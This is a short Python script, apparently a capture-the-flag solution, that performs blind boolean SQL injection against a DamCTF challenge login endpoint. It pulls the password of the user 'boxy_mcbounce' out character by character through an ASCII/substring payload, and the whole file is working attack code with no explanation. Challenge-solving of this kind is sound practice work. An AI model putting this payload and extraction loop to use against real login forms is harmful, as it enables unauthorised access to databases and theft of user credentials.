import requests, string

url="https://bouncy-box.chals.damctf.xyz/login"

req = requests.session()
query="a' or Ascii(substring((SELECT password FROM users WHERE username = 'boxy_mcbounce' LIMIT 1),{pos},1))={i} -- -  "





letter = string.printable.replace("%","")
output=""
pos=0

while True:
    pos+=1
    for i in range(48,126):
        body={"username":query.format(i=str(i), pos=str(pos)),"password":"", "score":0}
        r = req.post(url, json=body)
        if "Logging" in r.text:
            output+=chr(i)
            print("OUTPUT: "+output+" - ")
            break


